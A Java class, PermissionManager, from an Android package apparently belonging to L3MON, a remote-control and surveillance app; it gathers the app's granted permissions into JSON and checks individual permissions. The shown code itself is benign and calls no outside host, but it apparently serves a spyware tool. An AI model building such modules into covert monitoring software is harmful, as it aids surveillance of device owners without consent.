package com.etechd.l3mon.core.permissions;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.etechd.l3mon.core.L3monApp;

import org.json.JSONArray;
import org.json.JSONObject;

public class PermissionManager {

    private static final String TAG = "PermissionManager";

    public static JSONObject getGrantedPermissions() {
        JSONObject data = new JSONObject();
        try {
            Context context = L3monApp.getContext();
            JSONArray perms = new JSONArray();
            PackageInfo pi = context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);

            if (pi.requestedPermissions != null && pi.requestedPermissionsFlags != null) {
                for (int i = 0; i < pi.requestedPermissions.length; i++) {
                    boolean granted = (pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0;

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        if (pi.requestedPermissions[i] != null) {
                            granted = ContextCompat.checkSelfPermission(context, pi.requestedPermissions[i]) == PackageManager.PERMISSION_GRANTED;
                        }
                    }

                    if (granted) {
                        perms.put(pi.requestedPermissions[i]);
                    }
                }
            }

            data.put("permissions", perms);

        } catch (Exception e) {
            Log.e(TAG, "getGrantedPermissions error", e);
            try {
                data.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return data;
    }

    public static boolean canIUse(String perm) {
        try {
            if (perm == null) return false;
            Context context = L3monApp.getContext();
            return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            Log.e(TAG, "canIUse error", e);
            return false;
        }
    }
}
